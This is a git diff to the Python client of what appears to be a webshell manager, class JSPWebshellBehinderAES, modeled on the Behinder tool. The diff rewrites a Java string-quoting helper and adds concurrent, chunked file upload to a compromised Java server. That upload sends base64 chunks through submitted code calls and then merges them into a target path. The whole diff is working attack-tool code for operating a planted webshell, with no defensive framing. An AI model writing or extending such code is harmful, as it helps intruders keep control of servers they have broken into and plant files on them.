@@ -52,19 +52,13 @@ def parse_permission(perm: str):
     return result
 
 
-def java_repr(s):
-    return (
-        '"'
-        + "".join(
-            (
-                c
-                if c in string.ascii_letters or c in string.digits
-                else hex(ord(c)).replace("0x", "\\x")
-            )
-            for c in s
-        )
-        + '"'
-    )
+def java_repr(obj):
+    if isinstance(obj, str):
+        return json.dumps(obj)
+    elif isinstance(obj, list) and all(isinstance(x, str) for x in obj):
+        return "(new String[]{" + ",".join(java_repr(x) for x in obj) + "})"
+    else:
+        raise NotImplementedError(f"{type(obj)=}")
 
 
 def md5_encode(s):
@@ -172,6 +166,13 @@ class JSPWebshellBehinderAES:
         self.https_verify = session_conn.get("https_verify", False)
         self.client = get_http_client(verify=self.https_verify)
         self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
+        self.updownload_chunk_size = int(
+            session_conn.get("updownload_chunk_size", 1024 * 128)
+        )
+        self.updownload_max_coroutine = int(
+            session_conn.get("updownload_max_coroutine", 4)
+        )
+
         self.compile_semaphore = asyncio.Semaphore(
             int(session_conn.get("compile_max_coroutine", 4))
         )
@@ -294,6 +295,56 @@ class JSPWebshellBehinderAES:
         await self.submit_code(
             f"copyFile({json.dumps(filepath)}, {json.dumps(new_filepath)})"
         )
+
+    async def upload_file(
+        self, filepath: str, content: bytes, callback: t.Union[t.Callable, None] = None
+    ) -> bool:
+        semaphore = asyncio.Semaphore(self.updownload_max_coroutine)
+        write_state_lock = asyncio.Lock()
+
+        chunk_size = self.updownload_chunk_size
+        coros: t.List[t.Awaitable] = []
+        done_coro = 0
+        done_bytes = 0
+        filepath_status = await self.submit_code(
+            f"checkUploadFilepath({java_repr(filepath)})"
+        )
+        if filepath_status == "WRONG_NO_PERMISSION":
+            raise exceptions.FileError("没有权限写入文件")
+        if filepath_status == "WRONG_EXISTED":
+            raise exceptions.FileError("文件已经存在")
+        if filepath_status != "OK":
+            raise exceptions.TargetRuntimeError("检查文件路径时发生未知错误")
+
+        async def upload_chunk(chunk: bytes):
+            nonlocal done_coro, done_bytes
+            filepath = None
+            async with semaphore:
+                chunk_b64 = base64_encode(chunk)
+                filepath = await self.submit_code(
+                    f"putTempFile(base64Decode({java_repr(chunk_b64)}))"
+                )
+            async with write_state_lock:
+                done_coro += 1
+                done_bytes += len(chunk)
+                if callback:
+                    callback(
+                        done_coro=done_coro,
+                        max_coro=len(coros),
+                        done_bytes=done_bytes,
+                        max_bytes=len(content),
+                    )
+            return filepath
+
+        coros = [
+            upload_chunk(content[i : i + chunk_size])
+            for i in range(0, len(content), chunk_size)
+        ]
+        uploaded_chunks = await asyncio.gather(*coros)
+        result = await self.submit_code(
+            f"mergeFiles({java_repr(uploaded_chunks)}, {java_repr(filepath)})"
+        )
+        return result  # can only be true
 
     async def get_pwd(self) -> str:
         return await self.submit_code("getPwd()")
